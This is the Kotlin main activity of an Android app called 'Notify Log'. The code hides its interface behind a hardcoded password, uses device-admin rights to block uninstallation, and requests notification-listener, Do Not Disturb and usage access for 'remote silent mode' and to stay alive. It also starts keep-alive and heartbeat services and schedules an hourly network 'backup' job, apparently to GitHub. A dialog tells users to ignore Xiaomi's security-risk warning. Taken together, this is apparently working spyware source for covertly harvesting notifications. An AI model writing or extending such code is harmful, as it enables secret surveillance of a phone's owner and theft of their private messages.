package com.example.notiflogger
import android.app.AlarmManager
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.view.inputmethod.InputMethodManager
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.NotificationManagerCompat

class MainActivity : AppCompatActivity() {
    private lateinit var dbHelper: DatabaseHelper
    private lateinit var logTextView: TextView
    
    // Declare these up here so we can use them in onResume()
    private lateinit var btnAdmin: Button
    private lateinit var dpm: DevicePolicyManager
    private lateinit var adminComponent: ComponentName

    private val logUpdateReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            refreshLogs()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        dbHelper = DatabaseHelper(this)
        
        // UI Elements
        val loginLayout = findViewById<LinearLayout>(R.id.loginLayout)
        val mainContentLayout = findViewById<LinearLayout>(R.id.mainContentLayout)
        val passwordInput = findViewById<EditText>(R.id.passwordInput)
        val btnUnlock = findViewById<Button>(R.id.btnUnlock)
        
        logTextView = findViewById(R.id.logTextView)
        val btnRefresh = findViewById<Button>(R.id.btnRefresh)
        val btnClear = findViewById<Button>(R.id.btnClear)
        
        // Setup Device Admin components
        btnAdmin = findViewById(R.id.btnAdmin)
        dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent = ComponentName(this, AdminReceiver::class.java)

        // Button Click Logic
        btnAdmin.setOnClickListener {
            if (!dpm.isAdminActive(adminComponent)) {
                // Request Admin Rights
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "This prevents the app from being uninstalled without the password.")
                }
                startActivity(intent)
            } else {
                // Remove Admin Rights (Allows Uninstallation)
                dpm.removeActiveAdmin(adminComponent)
                updateAdminButtonUI() // Instantly update the button
                Toast.makeText(this, "Protection disabled. You can now uninstall.", Toast.LENGTH_SHORT).show()
            }
        }

        // --- PASSWORD LOGIC ---
        btnUnlock.setOnClickListener {
            if (passwordInput.text.toString() == "sosojojo") {
                // 1. Hide the keyboard
                val imm = getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
                imm.hideSoftInputFromWindow(passwordInput.windowToken, 0)
                
                // 2. Switch the screens
                loginLayout.visibility = View.GONE
                mainContentLayout.visibility = View.VISIBLE
                
                // 3. Ask for permissions only AFTER they log in successfully
                checkPermissions()
            } else {
                Toast.makeText(this, "Incorrect Password", Toast.LENGTH_SHORT).show()
                passwordInput.text.clear()
            }
        }

        refreshLogs()

        btnRefresh.setOnClickListener {
            refreshLogs()
        }

        // This ONLY deletes the local SQLite database. It does NOT touch GitHub.
        btnClear.setOnClickListener {
            val db = dbHelper.writableDatabase
            db.execSQL("DELETE FROM logs")
            db.close()
            refreshLogs()
            Toast.makeText(this, "Local logs cleared!", Toast.LENGTH_SHORT).show()
        }

        val filter = IntentFilter("com.example.notiflogger.NEW_NOTIFICATION")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(logUpdateReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(logUpdateReceiver, filter)
        }
    }

    // NEW: This runs every time you return to the app screen
    override fun onResume() {
        super.onResume()
        if (::btnAdmin.isInitialized) {
            updateAdminButtonUI()
        }
    }

    // NEW: A helper function to change the button color/text cleanly
    private fun updateAdminButtonUI() {
        if (dpm.isAdminActive(adminComponent)) {
            btnAdmin.text = "🔓 Disable Uninstall Protection"
            btnAdmin.backgroundTintList = getColorStateList(android.R.color.holo_red_dark)
        } else {
            btnAdmin.text = "🛡️ Enable Uninstall Protection"
            btnAdmin.backgroundTintList = getColorStateList(android.R.color.holo_blue_dark)
        }
    }

    private fun checkPermissions() {
    val permissionManager = PermissionManager(this)
    permissionManager.requestAllPermissions()
}

// Replace the entire PermissionManager class with this:
class PermissionManager(private val activity: MainActivity) {
    
    fun requestAllPermissions() {
        requestNotificationAccess()
        requestDndAccess()
        requestWriteSettings()
        requestUsageAccess()
        requestBatteryOptimization()
        requestExactAlarms()
        requestDisplayOverlay()
        requestNotificationPermission()
        checkManufacturerSettings()
        startAllServices()
    }
    // NEW: Request Modify System Settings
    private fun requestWriteSettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!android.provider.Settings.System.canWrite(activity)) {
                val intent = Intent(android.provider.Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
                    data = android.net.Uri.parse("package:${activity.packageName}")
                }
                activity.startActivity(intent)
                android.widget.Toast.makeText(
                    activity, 
                    "Please allow 'Modify System Settings' to force silent mode.", 
                    android.widget.Toast.LENGTH_LONG
                ).show()
            }
        }
    }
    private fun requestUsageAccess() {
        val appOpsManager = activity.getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOpsManager.unsafeCheckOpNoThrow(
                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, 
                android.os.Process.myUid(), 
                activity.packageName
            )
        } else {
            appOpsManager.checkOpNoThrow(
                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, 
                android.os.Process.myUid(), 
                activity.packageName
            )
        }

        if (mode != android.app.AppOpsManager.MODE_ALLOWED) {
            val intent = Intent(android.provider.Settings.ACTION_USAGE_ACCESS_SETTINGS)
            activity.startActivity(intent)
            android.widget.Toast.makeText(
                activity, 
                "Please allow 'Usage Access' to keep the app alive.", 
                android.widget.Toast.LENGTH_LONG
            ).show()
        }
    }
    private fun requestDndAccess() {
        val notificationManager = activity.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
        if (!notificationManager.isNotificationPolicyAccessGranted) {
            val intent = Intent(android.provider.Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)
            activity.startActivity(intent)
            android.widget.Toast.makeText(
                activity, 
                "Please grant 'Do Not Disturb' access to allow remote silent mode.", 
                android.widget.Toast.LENGTH_LONG
            ).show()
        }
    }
    private fun requestNotificationAccess() {
        val enabledListeners = android.provider.Settings.Secure.getString(
            activity.contentResolver,  // FIXED: added activity.
            "enabled_notification_listeners"
        )
        
        if (enabledListeners == null || !enabledListeners.contains(activity.packageName)) {  // FIXED: added activity.
            android.app.AlertDialog.Builder(activity)
                .setTitle("Notification Access Required")
                .setMessage("You need to manually enable notification access for this app.\n\n" +
                           "Step 1: Find 'Notify Log' in the list\n" +
                           "Step 2: Toggle the switch ON\n\n" +
                           "The app may crash once - this is normal. Restart after enabling.")
                .setPositiveButton("Open Settings") { _, _ ->
                    val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
                    activity.startActivity(intent)  // FIXED: added activity.
                }
                .setNegativeButton("Cancel", null)
                .show()
        }
    }
    
    private fun requestBatteryOptimization() {
        val pm = activity.getSystemService(Context.POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(activity.packageName)) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
        }
    }
    
    private fun requestExactAlarms() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            if (!alarmManager.canScheduleExactAlarms()) {
                val intent = Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
                    data = Uri.parse("package:${activity.packageName}")
                }
                activity.startActivity(intent)
            }
        }
    }
    
    private fun requestDisplayOverlay() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(activity)) {
                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                    data = Uri.parse("package:${activity.packageName}")
                }
                activity.startActivity(intent)
            }
        }
    }
    
    private fun requestNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (activity.checkSelfPermission(android.Manifest.permission.POST_NOTIFICATIONS)
                != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                activity.requestPermissions(
                    arrayOf(android.Manifest.permission.POST_NOTIFICATIONS),
                    1001
                )
            }
        }
    }
    
    private fun checkManufacturerSettings() {
        val manufacturer = Build.MANUFACTURER.lowercase()
        
        when {
            manufacturer.contains("xiaomi") || manufacturer.contains("redmi") || manufacturer.contains("poco") -> {
                android.widget.Toast.makeText(
                    activity,
                    "XIAOMI: Settings → Passwords & security → Privacy → Notification access",
                    android.widget.Toast.LENGTH_LONG
                ).show()
                showXiaomiNotificationGuide()
            }
            manufacturer.contains("samsung") -> {
                android.widget.Toast.makeText(
                    activity,
                    "SAMSUNG: Settings → Notifications → Notification access",
                    android.widget.Toast.LENGTH_LONG
                ).show()
            }
            manufacturer.contains("huawei") || manufacturer.contains("honor") -> {
                android.widget.Toast.makeText(
                    activity,
                    "HUAWEI: Settings → Apps → Apps → Notify Log → Notification access",
                    android.widget.Toast.LENGTH_LONG
                ).show()
            }
            manufacturer.contains("oppo") || manufacturer.contains("oneplus") || manufacturer.contains("realme") -> {
                android.widget.Toast.makeText(
                    activity,
                    "OPPO: Settings → Notifications & status bar → Notification access",
                    android.widget.Toast.LENGTH_LONG
                ).show()
            }
        }
    }
    
    private fun showXiaomiNotificationGuide() {
        android.app.AlertDialog.Builder(activity)
            .setTitle("Xiaomi Special Instructions")
            .setMessage("On Xiaomi phones:\n\n" +
                       "1. Go to Settings\n" +
                       "2. Passwords & security\n" +
                       "3. Privacy\n" +
                       "4. Notification access\n" +
                       "5. Find 'Notify Log' and enable\n\n" +
                       "If it shows 'Security risk' warning, ignore and enable anyway.")
            .setPositiveButton("OK", null)
            .show()
    }
    
    private fun startAllServices() {
        val notifIntent = Intent(activity, NotificationService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            activity.startForegroundService(notifIntent)
        } else {
            activity.startService(notifIntent)
        }
        
        val keepAliveIntent = Intent(activity, KeepAliveService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            activity.startForegroundService(keepAliveIntent)
        } else {
            activity.startService(keepAliveIntent)
        }
        
        val heartbeatIntent = Intent(activity, HeartbeatService::class.java)
        activity.startService(heartbeatIntent)
        
        AlarmScheduler.scheduleAlarms(activity)
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            scheduleBackupJob()
        }
    }
    
    private fun scheduleBackupJob() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val jobScheduler = activity.getSystemService(Context.JOB_SCHEDULER_SERVICE) as android.app.job.JobScheduler
            
            val job = android.app.job.JobInfo.Builder(1005, 
                android.content.ComponentName(activity, BackupJobService::class.java))
                .setPeriodic(60 * 60 * 1000) // Every 1 hour
                .setRequiredNetworkType(android.app.job.JobInfo.NETWORK_TYPE_ANY)
                .setRequiresDeviceIdle(false)
                .setRequiresCharging(false)
                .setPersisted(true)
                .build()
            
            jobScheduler.schedule(job)
        }
    }
}

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(logUpdateReceiver)
    }

    private fun refreshLogs() {
        val logs = dbHelper.getAllLogs()
        if (logs.isNotEmpty()) {
            logTextView.text = logs
        } else {
            logTextView.text = "Waiting for notifications..."
        }
    }
}
